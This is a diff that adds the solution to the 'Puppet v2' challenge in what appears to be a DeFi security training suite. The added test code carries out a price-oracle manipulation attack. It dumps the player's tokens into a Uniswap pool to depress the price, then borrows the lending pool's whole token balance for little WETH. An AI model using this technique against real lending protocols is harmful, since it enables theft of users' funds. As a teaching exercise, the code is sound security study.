@@ -83,6 +83,36 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log(
+            'WETH REQUIRED BEFORE SWAP: ',
+            String(await lendingPool.calculateDepositOfWETHRequired(PLAYER_INITIAL_TOKEN_BALANCE))
+        )
+    
+        // Approve all attacker's DVT balance to UniswapRouter contract.
+        await token
+            .connect(player)
+            .approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+    
+        // Swap all DVT tokens with WETH using the UniswapRouter contract.
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
+            0, // amountOutMin
+            [token.address, weth.address], // [tokenFromUserToPool, tokenFromPoolToUser]
+            player.address, // to
+            (await ethers.provider.getBlock('latest')).timestamp * 2 // arbitrary deadline
+        )
+    
+        // Get the extra WETH needed by interacting with WETH9 contract
+        await weth.connect(player).deposit({value: ethers.utils.parseEther('19.6')})
+    
+        // Borrow all DVT tokens from pool (~29.5 WETH)
+        const wethRequired = await lendingPool.calculateDepositOfWETHRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        )
+        await weth.connect(player).approve(lendingPool.address, wethRequired)
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)
+    
+        console.log('WETH REQUIRED AFTER SWAP: ', String(wethRequired))
     });
 
     after(async function () {
